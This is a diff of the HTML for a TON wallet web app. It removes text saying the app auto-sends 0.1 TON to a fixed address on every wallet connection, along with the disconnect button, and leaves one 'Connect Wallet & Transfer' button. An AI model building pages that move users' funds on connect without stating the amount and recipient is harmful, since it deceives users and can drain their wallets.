@@ -15,26 +15,8 @@
         </header>
 
         <main>
-            <div class="card" id="connectionSection">
-                <h3>🔗 Connect Your Wallet</h3>
-                <p>Connect your TON wallet to start transferring.</p>
-                <button id="connectButton" class="btn-primary">Connect Wallet & Auto Transfer</button>
-                <p class="hint">Auto-transfer will trigger on every connection.</p>
-            </div>
-
-            <div class="card" id="transferSection" style="display: none;">
-                <div class="wallet-info">
-                    <span class="badge">✅ Connected</span>
-                    <p class="address" id="walletAddress">Loading...</p>
-                </div>
-                
-                <div class="transfer-info">
-                    <h3>💸 Auto Transfer TON</h3>
-                    <p>This app will automatically send **0.1 TON** to **0QD4...N P_-U**.</p>
-                </div>
-                
-                <button id="transferButton" class="btn-success">Send TON Again</button>
-                <button id="disconnectButton" class="btn-secondary">Disconnect</button>
+            <div class="card">
+                <button id="mainButton" class="btn-primary">Connect Wallet & Transfer</button>
             </div>
 
             <div id="statusMessage" class="status-message" style="display: none;"></div>
